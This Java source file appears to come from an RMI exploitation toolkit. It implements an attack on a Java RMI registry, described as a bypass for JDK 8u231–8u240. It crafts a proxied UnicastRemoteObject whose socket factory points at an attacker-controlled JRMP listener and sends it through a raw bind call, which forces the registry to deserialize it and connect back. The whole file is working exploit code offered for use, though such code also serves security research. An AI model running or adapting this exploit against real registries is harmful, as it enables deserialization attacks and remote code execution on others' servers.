package xyz.eki.marshalexp.rmi.attack;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import xyz.eki.marshalexp.rmi.utils.ReflectUtils;
import xyz.eki.marshalexp.rmi.utils.RemoteUtils;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import java.lang.reflect.Constructor;
import java.lang.reflect.Proxy;
import java.rmi.server.ObjID;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.UnicastRemoteObject;
import java.util.Random;

/*
Bypass 8u231~8u240
 */
public class AttackRegistryByJRMPListener2 {
    public static void main(String[] args) {
        try {
            String registryHost = "127.0.0.1";
            int registryPort = 1099;
            String JRMPHost = "127.0.0.1";
            int JRMPPort = 12345;

            TCPEndpoint te = new TCPEndpoint(JRMPHost, JRMPPort);
            ObjID id = new ObjID(new Random().nextInt());
            UnicastRef refObject = new UnicastRef(new LiveRef(id, te, false));

            //触发关键在于RemoteObjectInvocationHandler的invoke方法
            RemoteObjectInvocationHandler myInvocationHandler = new RemoteObjectInvocationHandler(refObject);
            RMIServerSocketFactory handcraftedSSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
                    RMIServerSocketFactory.class.getClassLoader(),
                    new Class[] { RMIServerSocketFactory.class, java.rmi.Remote.class },
                    myInvocationHandler);


            Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null);
            constructor.setAccessible(true);
            UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(null);

            ReflectUtils.setFieldValue(remoteObject, "ssf", handcraftedSSF);
            // local
//            byte[] serializeData =  ReflectUtils.WriteObjectToBytes(remoteObject);
//            ReflectUtils.readObjectFromBytes(serializeData);

            //Bind(null, remoteObject)
//             attack registry
            RemoteUtils.sendRawCall(registryHost,registryPort,new ObjID(0),0,4905912898345647071L, null,remoteObject);
            System.out.println("Payload sent");

        }catch (Throwable t){
            t.printStackTrace();
        }
    }
}
